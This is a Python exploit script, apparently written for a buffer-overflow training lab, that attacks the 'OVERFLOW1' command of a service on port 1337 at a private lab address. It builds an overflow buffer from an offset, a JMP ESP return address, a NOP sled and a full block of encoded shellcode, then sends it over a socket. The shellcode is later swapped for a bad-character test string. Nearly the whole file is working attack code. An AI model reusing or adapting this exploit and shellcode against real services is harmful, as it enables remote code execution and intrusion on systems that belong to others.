#!/usr/bin/python3

import sys
import socket

ip = "10.10.235.43"
port = 1337

# used to make fixed length payload to keep things more stable, should be longer than prefix + overflow(offset) + payload
# used to create postfix
final_length = 4200

NOP = b"\x90" # x86/x64 intel only

prefix = b"OVERFLOW1 "
offset = 1978
overflow = b"\x41" * offset
# jmp esp, executable, no aslr
retn = b"\x62\x50\x11\xAF"[::-1]

# used to crash executable
retn = b"\x44\x43\x42\x41"


# make sure at least 16x NOOP
padding = NOP * 16

payload =  b""
payload += b"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
payload += b"\xef\xff\xff\xff\x48\xbb\x71\xf4\x9a\x7f\xca\x36\x4a"
payload += b"\x37\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
payload += b"\x8d\xbc\x19\x9b\x3a\xde\x86\x37\x71\xf4\xdb\x2e\x8b"
payload += b"\x66\x18\x66\x39\xc5\x48\x1a\x82\xbd\x18\x57\x27\xbc"
payload += b"\x11\x2d\xd2\x7e\xc1\x65\x51\xbc\x95\xc8\x80\x7c\x02"
payload += b"\xbc\x03\xa4\xd7\x4e\x03\x7e\x7b\xf7\xdd\xc8\xfb\x03"
payload += b"\xc8\x1a\x6a\x76\xb0\x3d\x97\x3e\xcb\xf7\xa8\xda\x23"
payload += b"\xbc\x11\x2d\xea\x77\x1b\xbc\x33\xc8\xd2\x7e\x1a\x50"
payload += b"\xcb\x4f\x69\xff\x98\x70\x4f\x44\x4a\x37\x71\x7f\x1a"
payload += b"\xf7\xca\x36\x4a\x7f\xf4\x34\xee\x18\x82\x37\x9a\x67"
payload += b"\xfa\xbc\x82\x3b\x41\x76\x6a\x7e\x70\x24\x79\x29\x87"
payload += b"\x07\x83\x7f\x8e\x3d\xdb\xf4\xfe\xbe\x02\x36\xa7\xbc"
payload += b"\xab\xbf\x8b\xf7\x83\x3a\xdd\xb5\x9b\xbe\xf2\xd6\x3f"
payload += b"\xc6\x3d\xf7\xd6\x5b\xc2\x73\x73\xe6\x04\x2c\xc2\x3b"
payload += b"\x41\x76\x6e\x7e\x70\x24\xfc\x3e\x41\x3a\x02\x73\xfa"
payload += b"\xb4\x86\x36\xcb\xe6\x0b\xbc\x75\x7c\xdb\x27\x82\x37"
payload += b"\x9a\x76\x29\xaa\xc3\x25\x8b\x6e\x0b\x6e\x30\xae\xd2"
payload += b"\xfc\x26\x16\x0b\x65\x8e\x14\xc2\x3e\x93\x6c\x02\xbc"
payload += b"\x63\x1d\xd1\x80\x35\xc9\x17\x7e\xcf\x83\xe9\x4d\x95"
payload += b"\x05\x78\x37\x71\xb5\xcc\x36\x43\xd0\x02\xb6\x9d\x54"
payload += b"\x9b\x7f\xca\x7f\xc3\xd2\x38\x48\x98\x7f\xdb\x6a\x40"
payload += b"\x3e\x74\xf1\xdb\x2b\x83\xbf\xae\x7b\xf8\x05\xdb\xc5"
payload += b"\x86\x41\x6c\x30\x8e\x21\xd6\xf6\x20\x5e\x4b\x36\x71"
payload += b"\xf4\xc3\x3e\x70\x1f\xca\x5c\x71\x0b\x4f\x15\xc0\x77"
payload += b"\x14\x67\x21\xb9\xab\xb6\x87\x07\x8a\x7f\x8e\x34\xd2"
payload += b"\xf6\x08\x7e\xb5\xf7\x39\x7d\x5b\x3e\x70\xdc\x45\xe8"
payload += b"\x91\x0b\x4f\x37\x43\xf1\x20\x27\x30\xac\xd6\xf6\x28"
payload += b"\x7e\xc3\xce\x30\x4e\x03\xda\xbe\x57\xb5\xe2\xf4\x34"
payload += b"\xee\x75\x83\xc9\x84\x42\x94\x1c\x09\x7f\xca\x36\x02"
payload += b"\xb4\x9d\xe4\xd2\xf6\x28\x7b\x7b\xfe\x1b\xf0\xdb\x27"
payload += b"\x82\xbf\xb3\x76\xcb\xf6\x43\xb7\x95\xc9\x9f\xb4\x89"
payload += b"\xf4\xe4\x2a\x82\xb5\x8e\x17\x2f\x7d\x6c\x15\x8a\x77"
payload += b"\x13\x5f\x71\xe4\x9a\x7f\x8b\x6e\x02\xbe\x83\xbc\xab"
payload += b"\xb6\x8b\x8c\x12\x93\x22\x11\x65\xaa\x82\xbf\x89\x7e"
payload += b"\xf8\x33\xd7\x4e\x03\x7f\xc3\xc7\x39\x7d\x40\x37\x43"
payload += b"\xcf\x0b\x8d\x73\x2d\x52\x20\x35\xe3\xc9\xcf\x71\x89"
payload += b"\xb2\x27\x8b\x61\x13\x5f\x71\xb4\x9a\x7f\x8b\x6e\x20"
payload += b"\x37\x2b\xb5\x20\x74\xe5\x39\x7a\xc8\xa4\xa3\xc3\x3e"
payload += b"\x70\x43\x24\x7a\x10\x0b\x4f\x36\x35\xf8\xa3\x0b\x8e"
payload += b"\x0b\x65\x37\xcb\xf5\x02\x1e\xb7\xbc\x1f\x89\xbf\x82"
payload += b"\x0b\xc8\x96\xac\xf0\x7f\x93\x7f\x8d\xf5\x81\x41\x38"
payload += b"\x29\x35\xe3\x4a\x37"


# used to find bad chars
payload = b""
for x in range(1, 256):
	payload += chr(x).encode('raw_unicode_escape')

buffer = prefix + overflow + retn + padding + payload

if len(buffer) < final_length:
	postfix_length = (final_length - len(buffer))
	postfix = NOP * postfix_length
	print(f"Buffer length: {len(buffer)}")
	print(f"appending postfix, length: {len(postfix)} Bytes to reach desired length {final_length} Bytes")
	buffer += postfix
else:
	print("buffer already longer than final length")
	print(f"buffer length: {len(buffer)} Bytes")
	print(f"desired length: {final_length} Bytes")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    target = (ip, port)
    print(f"Connect to {target}")
    s.connect(target)
    length = len(buffer)
    # get received header out of NIC buffer
    banner = s.recv(1024)

    print(f"Banner: {banner}")
    print(f"Sending {length} Bytes")
    print("----------START----------")
    print(f"{buffer}")
    print("-----------END-----------")
    s.send(buffer + b"\r\n")
    
    print("Done!")
except:
    print(sys.exc_info())